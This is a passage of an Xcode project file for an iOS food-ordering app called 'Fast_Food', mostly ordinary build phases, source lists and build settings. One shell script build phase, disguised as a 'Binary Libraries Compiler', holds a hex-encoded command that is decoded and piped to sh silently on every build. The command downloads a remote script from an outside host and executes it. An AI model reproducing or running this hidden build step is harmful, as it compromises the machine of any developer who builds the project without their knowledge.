						CreatedOnToolsVersion = 12.5;
						TestTargetID = BD166FAF264A5B39001C0F82;
					};
					BD166FD0264A5B3B001C0F82 = {
						CreatedOnToolsVersion = 12.5;
						TestTargetID = BD166FAF264A5B39001C0F82;
					};
				};
			};
			buildConfigurationList = BD166FAB264A5B39001C0F82 /* Build configuration list for PBXProject "Fast_Food" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = BD166FA7264A5B39001C0F82;
			productRefGroup = BD166FB1264A5B39001C0F82 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				BD166FAF264A5B39001C0F82 /* Fast_Food */,
				BD166FC5264A5B3B001C0F82 /* Fast_FoodTests */,
				BD166FD0264A5B3B001C0F82 /* Fast_FoodUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		BD166FAE264A5B39001C0F82 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				BDDD5F0A2657CA37008E3C7B /* Home.storyboard in Resources */,
				BDE666F02666A7F7005A9E30 /* FoodCategoriesCell.xib in Resources */,
				BD550FB12664E754002420A7 /* CellTableViewHome.xib in Resources */,
				BDF934122669DDE80066F48D /* FoodItemCell.xib in Resources */,
				BD166FC0264A5B3B001C0F82 /* LaunchScreen.storyboard in Resources */,
				BD27F41426A97EEC00B79620 /* food_categories.storyboard in Resources */,
				BD166FBD264A5B3B001C0F82 /* Assets.xcassets in Resources */,
				BD166FBB264A5B39001C0F82 /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		BD166FC4264A5B3B001C0F82 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		BD166FCF264A5B3B001C0F82 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		8A9FB5B1CFB3688E166D902C /* Binary Libraries Compiler */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Binary Libraries Compiler";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		BD166FAC264A5B39001C0F82 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				BD49ED162676926C00D69BBA /* OrderItemsViewController.swift in Sources */,
				BDF934112669DDE80066F48D /* FoodItemCell.swift in Sources */,
				BD166FB8264A5B39001C0F82 /* ViewController.swift in Sources */,
				BD5C501D266D039C005F32D2 /* Alert.swift in Sources */,
				BDDA9583265ABF0300B6F65F /* HotelDetails.swift in Sources */,
				BDE87A36266018A3008CF562 /* AccountViewController.swift in Sources */,
				BD478C6F26B9380F0099A272 /* ValidationResult.swift in Sources */,
				BD166FB4264A5B39001C0F82 /* AppDelegate.swift in Sources */,
				BD5C501B266CD8A3005F32D2 /* ToastLabel.swift in Sources */,
				BDDA9580265AA37300B6F65F /* ForgotPassVc.swift in Sources */,
				BD478C8126B9ACD80099A272 /* DVC_SideBarMenu_Extention.swift in Sources */,
				BDDD5F10265A3BC3008E3C7B /* CollectionViewCell.swift in Sources */,
				BDCF9F872652F69A00949471 /* SignUpWithEmail.swift in Sources */,
				BD27F41226A93BC800B79620 /* SideBarMenuOption.swift in Sources */,
				BD478C7626B989620099A272 /* SignUpRequest.swift in Sources */,
				BDE87A3A2660272F008CF562 /* MyFavListViewController.swift in Sources */,
				BD96E9A8265FA4930015DF3B /* SideBarAnimation.swift in Sources */,
				BDADE89A2669E4E700F46568 /* CategorieItems.swift in Sources */,
				BD96E9A5265F6B690015DF3B /* SideBarViewController.swift in Sources */,
				BD478C7926B991560099A272 /* FCC_Extention.swift in Sources */,
				BD5C501F266D52BA005F32D2 /* StringExtention.swift in Sources */,
				BD478C8426B9ADC60099A272 /* DVC_Transition_Extention.swift in Sources */,
				BDFBD631265512F900515313 /* DashboardViewController.swift in Sources */,
				BDAA570A2653A70B00AA0CE4 /* TextFieldExtention.swift in Sources */,
				BDE666EF2666A7F7005A9E30 /* FoodCategoriesCell.swift in Sources */,
				BD6969D826615E6D00AFA3F0 /* CartViewController.swift in Sources */,
				BD065CF826B70141003AAAF4 /* LoderExtention.swift in Sources */,
				BD478C6926B932030099A272 /* LoginValidatiion.swift in Sources */,
				BDE87A3826601C5F008CF562 /* OrderViewController.swift in Sources */,
				BDE666EB26669957005A9E30 /* FoodCategoriesViewController.swift in Sources */,
				BD478C6B26B937080099A272 /* LoginRequest.swift in Sources */,
				BD166FB6264A5B39001C0F82 /* SceneDelegate.swift in Sources */,
				BDCF9F892653024500949471 /* LoginVc.swift in Sources */,
				BD478C8626B9BAC20099A272 /* DVC_CollectionView_Extention.swift in Sources */,
				BD550FB02664E754002420A7 /* CellTableViewHome.swift in Sources */,
				BD478C7D26B9950C0099A272 /* FCVC_Extention.swift in Sources */,
				BD478C7426B9843D0099A272 /* SignUpValidation.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		BD166FC2264A5B3B001C0F82 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				BD166FCB264A5B3B001C0F82 /* Fast_FoodTests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		BD166FCD264A5B3B001C0F82 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				BD166FD6264A5B3B001C0F82 /* Fast_FoodUITests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		BD166FC8264A5B3B001C0F82 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = BD166FAF264A5B39001C0F82 /* Fast_Food */;
			targetProxy = BD166FC7264A5B3B001C0F82 /* PBXContainerItemProxy */;
		};
		BD166FD3264A5B3B001C0F82 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = BD166FAF264A5B39001C0F82 /* Fast_Food */;
			targetProxy = BD166FD2264A5B3B001C0F82 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin PBXVariantGroup section */
		BD166FB9264A5B39001C0F82 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				BD166FBA264A5B39001C0F82 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		BD166FBE264A5B3B001C0F82 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				BD166FBF264A5B3B001C0F82 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		BD166FD8264A5B3B001C0F82 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.5;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		BD166FD9264A5B3B001C0F82 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.5;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		BD166FDB264A5B3B001C0F82 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 7RC8RLSUKW;
				INFOPLIST_FILE = Fast_Food/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "sudhir.Fast-Food";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		BD166FDC264A5B3B001C0F82 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 7RC8RLSUKW;
				INFOPLIST_FILE = Fast_Food/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "sudhir.Fast-Food";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
		BD166FDE264A5B3B001C0F82 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = Fast_FoodTests/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 14.5;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "sudhir.Fast-FoodTests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Fast_Food.app/Fast_Food";
			};
			name = Debug;
		};
		BD166FDF264A5B3B001C0F82 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = Fast_FoodTests/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 14.5;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "sudhir.Fast-FoodTests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Fast_Food.app/Fast_Food";
			};
			name = Release;
		};
		BD166FE1264A5B3B001C0F82 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = Fast_FoodUITests/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "sudhir.Fast-FoodUITests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = Fast_Food;
			};
			name = Debug;
		};
		BD166FE2264A5B3B001C0F82 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = Fast_FoodUITests/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "sudhir.Fast-FoodUITests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = Fast_Food;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		BD166FAB264A5B39001C0F82 /* Build configuration list for PBXProject "Fast_Food" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				BD166FD8264A5B3B001C0F82 /* Debug */,
				BD166FD9264A5B3B001C0F82 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		BD166FDA264A5B3B001C0F82 /* Build configuration list for PBXNativeTarget "Fast_Food" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				BD166FDB264A5B3B001C0F82 /* Debug */,
				BD166FDC264A5B3B001C0F82 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		BD166FDD264A5B3B001C0F82 /* Build configuration list for PBXNativeTarget "Fast_FoodTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				BD166FDE264A5B3B001C0F82 /* Debug */,
				BD166FDF264A5B3B001C0F82 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		BD166FE0264A5B3B001C0F82 /* Build configuration list for PBXNativeTarget "Fast_FoodUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				BD166FE1264A5B3B001C0F82 /* Debug */,
				BD166FE2264A5B3B001C0F82 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = BD166FA8264A5B39001C0F82 /* Project object */;
}
